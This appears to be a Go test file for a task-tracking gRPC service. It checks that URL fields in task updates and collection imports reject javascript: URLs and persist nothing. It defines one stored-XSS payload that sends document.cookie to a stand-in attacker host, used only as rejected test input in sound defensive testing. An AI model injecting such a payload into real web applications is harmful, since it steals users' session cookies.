package server_test

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	pb "github.com/farmtable-io/farmtable/api/farmtable/v1"
	"github.com/farmtable-io/farmtable/internal/testutil"
	"github.com/google/uuid"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

const xssPayload = "javascript:fetch('//attacker/'+document.cookie)"

// newTaskForURLTest creates a collection and a task to update.
func newTaskForURLTest(t *testing.T, client pb.FarmTableServiceClient) string {
	t.Helper()
	collID := createTestCollection(t, client)
	created, err := client.CreateTask(context.Background(), &pb.CreateTaskRequest{
		CollectionId: collID,
		Name:         "url validation test",
	})
	if err != nil {
		t.Fatalf("CreateTask: %v", err)
	}
	return created.GetId()
}

// TestRPC_UpdateTask_RejectsScriptURLInPullRequest pins the traced attack path:
// the PullRequest.url field reaches an unescaped href in the dashboard
// (web/src/components/inspector/ft-inspector-code.ts).
//
// Note that testutil.NewTestServer registers the service with NO gRPC
// interceptors, which is structurally identical to the CLI pass-through
// registration in internal/cli/connect.go. A fix implemented as an interceptor
// would not be exercised here at all, so this test is a real check that the
// validation lives on the service method itself.
func TestRPC_UpdateTask_RejectsScriptURLInPullRequest(t *testing.T) {
	client, cleanup := testutil.NewTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskID := newTaskForURLTest(t, client)

	// The payload sits at index 1, behind a legitimate PR. Every URL fixture in
	// this suite used to sit at index 0 of a one-element list, so a guard that
	// stopped after the first element regressed invisibly: mutating the loop to
	// validate only add_pull_requests[0] left the suite green.
	_, err := client.UpdateTask(ctx, &pb.UpdateTaskRequest{
		Id: taskID,
		AddPullRequests: []*pb.PullRequest{
			{
				Id:     "1",
				Url:    "https://github.com/o/r/pull/1",
				Status: pb.PullRequestStatus_PULL_REQUEST_STATUS_OPEN,
			},
			{
				Id:     "2",
				Url:    xssPayload,
				Status: pb.PullRequestStatus_PULL_REQUEST_STATUS_OPEN,
			},
		},
	})
	if err == nil {
		t.Fatalf("UpdateTask accepted %q at add_pull_requests[1].url, want InvalidArgument", xssPayload)
	}
	st, _ := status.FromError(err)
	if st.Code() != codes.InvalidArgument {
		t.Errorf("code = %v, want InvalidArgument (err=%v)", st.Code(), err)
	}
	// Attribute the rejection. InvalidArgument alone would also be returned for
	// an unrelated problem with the request, so the code on its own is not an
	// oracle for "the URL guard fired".
	if !strings.Contains(st.Message(), "add_pull_requests[1].url") {
		t.Errorf("message = %q, want it to name add_pull_requests[1].url; "+
			"without that this test cannot tell the URL guard from any other "+
			"InvalidArgument the request might produce", st.Message())
	}

	// Neither PR may be persisted: the whole update is rejected, so the
	// legitimate one at index 0 must not be half-applied either.
	got, err := client.GetTask(ctx, &pb.GetTaskRequest{Id: taskID})
	if err != nil {
		t.Fatalf("GetTask: %v", err)
	}
	for _, pr := range got.GetTask().GetCodeContext().GetPullRequests() {
		if pr.GetUrl() == xssPayload {
			t.Errorf("payload was persisted despite rejection: %q", pr.GetUrl())
		}
	}
	if n := len(got.GetTask().GetCodeContext().GetPullRequests()); n != 0 {
		t.Errorf("rejected update was partially applied: %d pull requests persisted, want 0", n)
	}
}

// TestRPC_UpdateTask_RejectsScriptURLInRemoteURL pins the second live URL field.
// remote_url reaches an unescaped href in
// web/src/components/inspector/ft-inspector-meta.ts.
func TestRPC_UpdateTask_RejectsScriptURLInRemoteURL(t *testing.T) {
	client, cleanup := testutil.NewTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskID := newTaskForURLTest(t, client)

	payload := xssPayload
	_, err := client.UpdateTask(ctx, &pb.UpdateTaskRequest{
		Id:        taskID,
		RemoteUrl: &payload,
	})
	if err == nil {
		t.Fatalf("UpdateTask accepted %q in remote_url, want InvalidArgument", payload)
	}
	st, _ := status.FromError(err)
	if st.Code() != codes.InvalidArgument {
		t.Errorf("code = %v, want InvalidArgument (err=%v)", st.Code(), err)
	}
	if !strings.Contains(st.Message(), "remote_url") {
		t.Errorf("message = %q, want it to name remote_url", st.Message())
	}

	got, err := client.GetTask(ctx, &pb.GetTaskRequest{Id: taskID})
	if err != nil {
		t.Fatalf("GetTask: %v", err)
	}
	if got.GetTask().GetRemoteUrl() == payload {
		t.Errorf("payload was persisted despite rejection: %q", got.GetTask().GetRemoteUrl())
	}
}

// TestRPC_ImportCollection_RejectsScriptURLs pins the THIRD ingress path.
// ImportCollection copies PullRequests and RemoteData verbatim out of a
// caller-uploaded JSON document, so a scheme check placed only in UpdateTask is
// bypassable by importing a collection.
func TestRPC_ImportCollection_RejectsScriptURLs(t *testing.T) {
	client, _, cleanup := newExportImportTestServer(t)
	defer cleanup()
	ctx := context.Background()

	baseTask := func() map[string]interface{} {
		return map[string]interface{}{
			"id": uuid.New().String(), "title": "imported", "description": "",
			"phase": "open", "stage": "accepted", "native_label": "accepted",
			"type": "", "labels": []string{}, "repo": "", "branch": "",
			"pull_requests": []map[string]string{}, "remote_data": map[string]interface{}{},
		}
	}

	tests := []struct {
		name string
		// wantField must appear in the error message. export_import.go re-wraps
		// EVERY importedTask failure as InvalidArgument, so the status code
		// alone is not an oracle: the document would also be "rejected" for a
		// completely unrelated reason and this test would still pass. Proved by
		// mutation -- changing the guard's code to PermissionDenied turned 22
		// other subtests red and left both of these green.
		wantField string
		mutar     func(map[string]interface{})
	}{
		// The payload is at index 1, behind a legitimate PR: a guard that
		// validated only pull_requests[0] used to survive this test.
		{"pull request url", "pull_requests[1].url", func(d map[string]interface{}) {
			d["pull_requests"] = []map[string]string{
				{"id": "1", "url": "https://github.com/o/r/pull/1", "status": "open"},
				{"id": "2", "url": xssPayload, "status": "open"},
			}
		}},
		{"remote_data remote_url", "remote_data.remote_url", func(d map[string]interface{}) {
			d["remote_data"] = map[string]interface{}{"remote_url": xssPayload}
		}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			collName := "import xss " + tt.name
			taskDoc := baseTask()
			tt.mutar(taskDoc)
			doc := minimalImportDoc(collName, nil,
				[]map[string]interface{}{taskDoc}, nil, nil, nil)
			doc["format_version"] = 2
			data, _ := json.Marshal(doc)

			_, err := client.ImportCollection(ctx, &pb.ImportCollectionRequest{Data: data})
			if status.Code(err) != codes.InvalidArgument {
				t.Fatalf("ImportCollection err = %v, want InvalidArgument", err)
			}
			if msg := status.Convert(err).Message(); !strings.Contains(msg, tt.wantField) {
				t.Errorf("message = %q, want it to name %q. Without this the test passes for "+
					"a document rejected for any other reason at all.", msg, tt.wantField)
			}

			// Nothing may be persisted. The sibling UpdateTask tests check this
			// and these did not, so a guard that rejected the response after
			// committing the import would have shipped green.
			colls, err := client.ListCollections(ctx, &pb.ListCollectionsRequest{PageSize: 200})
			if err != nil {
				t.Fatalf("ListCollections: %v", err)
			}
			for _, c := range colls.GetItems() {
				if c.GetName() == collName {
					t.Errorf("collection %q was persisted despite the import being rejected", collName)
				}
			}
		})
	}
}

// TestRPC_ImportCollection_AcceptsHTTPURLs is the control for the import path:
// a legitimate collection must still import.
func TestRPC_ImportCollection_AcceptsHTTPURLs(t *testing.T) {
	client, _, cleanup := newExportImportTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskDoc := map[string]interface{}{
		"id": uuid.New().String(), "title": "imported", "description": "",
		"phase": "open", "stage": "accepted", "native_label": "accepted",
		"type": "", "labels": []string{}, "repo": "", "branch": "",
		"pull_requests": []map[string]string{
			{"id": "1", "url": "https://github.com/o/r/pull/1", "status": "open"},
		},
		"remote_data": map[string]interface{}{"remote_url": "https://github.com/o/r/issues/1"},
	}
	doc := minimalImportDoc("import ok", nil, []map[string]interface{}{taskDoc}, nil, nil, nil)
	doc["format_version"] = 2
	data, _ := json.Marshal(doc)

	if _, err := client.ImportCollection(ctx, &pb.ImportCollectionRequest{Data: data}); err != nil {
		t.Fatalf("ImportCollection rejected legitimate URLs: %v", err)
	}
}

// TestRPC_UpdateTask_AcceptsHTTPURLs is the control: the fix must not break
// legitimate URLs on either field.
func TestRPC_UpdateTask_AcceptsHTTPURLs(t *testing.T) {
	client, cleanup := testutil.NewTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskID := newTaskForURLTest(t, client)

	prURL := "https://github.com/ptone/farmtable/pull/7"
	remoteURL := "http://example.com/issues/9"

	updated, err := client.UpdateTask(ctx, &pb.UpdateTaskRequest{
		Id:        taskID,
		RemoteUrl: &remoteURL,
		AddPullRequests: []*pb.PullRequest{{
			Id:     "7",
			Url:    prURL,
			Status: pb.PullRequestStatus_PULL_REQUEST_STATUS_OPEN,
		}},
	})
	if err != nil {
		t.Fatalf("UpdateTask rejected legitimate URLs: %v", err)
	}
	if updated.GetRemoteUrl() != remoteURL {
		t.Errorf("remote_url = %q, want %q", updated.GetRemoteUrl(), remoteURL)
	}
	prs := updated.GetCodeContext().GetPullRequests()
	if len(prs) != 1 || prs[0].GetUrl() != prURL {
		t.Errorf("pull_requests = %v, want one PR with url %q", prs, prURL)
	}
}
